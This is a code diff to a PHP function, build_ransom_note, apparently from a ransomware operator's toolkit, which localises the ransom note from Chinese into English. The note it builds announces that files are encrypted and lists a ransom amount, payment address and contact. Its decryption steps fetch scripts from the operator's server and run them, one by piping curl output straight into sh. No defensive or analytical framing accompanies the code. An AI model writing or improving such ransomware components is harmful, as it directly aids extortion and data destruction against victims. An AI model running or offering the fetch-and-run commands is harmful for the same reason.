@@ -83,25 +83,25 @@ function build_ransom_note($r, $plat, $c2='') {
     // 解密一律走零依赖脚本：Linux/macOS 用 jasmin_unlock.sh (纯 openssl)，
     // Windows 用 jasmin_unlock.ps1 (纯 PowerShell 7+，无需编译 exe)
     $dec = ($plat === 'win')
-        ? "Windows (需 PowerShell 7+)\n"
+        ? "Windows (requires PowerShell 7+)\n"
          ."  curl.exe -sL {$srv}/payloads/jasmin_unlock.ps1 -o unlock.ps1\n"
-         ."  pwsh -File unlock.ps1 -Server {$srv} -K \"<解密口令>\" -Paths C:\\目标目录"
-        : "Linux / macOS（纯 openssl，无需安装任何依赖）\n"
-         ."  curl -sL {$srv}/payloads/jasmin_unlock.sh | sh -s {$srv} \"<解密口令>\" <目标目录>\n"
-         ."  （解密口令与目标目录请向我们索取）";
+         ."  pwsh -File unlock.ps1 -Server {$srv} -K \"<passphrase>\" -Paths C:\\TargetFolder"
+        : "Linux / macOS (pure openssl, no dependencies required)\n"
+         ."  curl -sL {$srv}/payloads/jasmin_unlock.sh | sh -s {$srv} \"<passphrase>\" <target_folder>\n"
+         ."  (Request the passphrase and target folder from us)";
     $n = "╔══════════════════════════════════════════╗\n";
     $n.= "║  {$t}\n";
-    // 标题已是中文时不再补中文副标题，避免两行重复
-    if (!preg_match('/[\x{4e00}-\x{9fa5}]/u', $t)) {
-        $n.= "║  你的文件已被加密\n";
+    // 标题若已含 ENCRYPT 字样则不再补副标题，避免两行重复
+    if (stripos($t, 'ENCRYPT') === false) {
+        $n.= "║  YOUR FILES HAVE BEEN ENCRYPTED\n";
     }
     $n.= "╚══════════════════════════════════════════╝\n\n";
-    $n.= "系统ID: {sid}\n\n";
+    $n.= "System ID: {sid}\n\n";
     $n.= "{$b}\n\n";
-    if ($p) $n.= "💰 赎金: {$p}\n";
-    if ($w) $n.= "💳 支付地址: {$w}\n";
-    if ($c) $n.= "📧 {$c}\n";
-    $n.= "\n🔓 解密方法:\n{$dec}\n";
-    $n.= "\n✅ SHA-256 校验确保文件100%还原\n";
+    if ($p) $n.= "Ransom Amount: {$p}\n";
+    if ($w) $n.= "Payment Address: {$w}\n";
+    if ($c) $n.= "Contact: {$c}\n";
+    $n.= "\nHow to Decrypt:\n{$dec}\n";
+    $n.= "\nSha-256 integrity verification guarantees 100% file restoration.\n";
     return $n;
 }
